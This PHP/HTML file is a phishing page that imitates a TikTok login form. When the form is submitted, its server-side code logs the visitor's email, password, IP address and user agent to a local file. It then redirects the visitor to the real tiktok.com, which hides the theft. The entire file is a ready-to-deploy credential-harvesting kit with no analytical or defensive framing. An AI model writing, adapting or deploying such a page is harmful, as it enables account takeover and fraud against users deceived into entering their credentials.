<?php
$log_dir = '../logs/tiktok';
if (!file_exists($log_dir)) mkdir($log_dir, 0777, true);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    $entry = "════════════════════════════════════════════════\n";
    $entry .= "TIME: " . date('Y-m-d H:i:s') . "\n";
    $entry .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $entry .= "USER-AGENT: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $entry .= "EMAIL: $email\n";
    $entry .= "PASSWORD: $password\n";
    $entry .= "════════════════════════════════════════════════\n\n";
    
    file_put_contents("$log_dir/tiktok.log", $entry, FILE_APPEND | LOCK_EX);
    header('Location: https://tiktok.com');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok • Official</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #000; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 15px; }
        .container { max-width: 400px; width: 100%; }
        .card { background: #111; border-radius: 16px; overflow: hidden; }
        .header { background: #1a1a1a; padding: 24px; text-align: center; }
        .header h1 { color: #fe2c55; font-size: 24px; font-weight: 700; margin-bottom: 4px; }
        .header p { color: #666; font-size: 14px; }
        .content { padding: 24px; }
        .form-group { margin-bottom: 16px; }
        .form-group input { width: 100%; padding: 14px; background: #1a1a1a; border: 2px solid #333; border-radius: 8px; color: white; font-size: 15px; }
        .form-group input:focus { outline: none; border-color: #fe2c55; }
        .btn { width: 100%; padding: 14px; background: #fe2c55; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .btn:hover { opacity: 0.9; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <h1>TikTok</h1>
                <p>Official Account</p>
            </div>
            <div class="content">
                <form method="POST">
                    <div class="form-group">
                        <input type="email" name="email" placeholder="Email or username" required>
                    </div>
                    <div class="form-group">
                        <input type="password" name="password" placeholder="Password" required>
                    </div>
                    <button type="submit" class="btn">Log in</button>
                </form>
            </div>
        </div>
    </div>
</body>
</html>
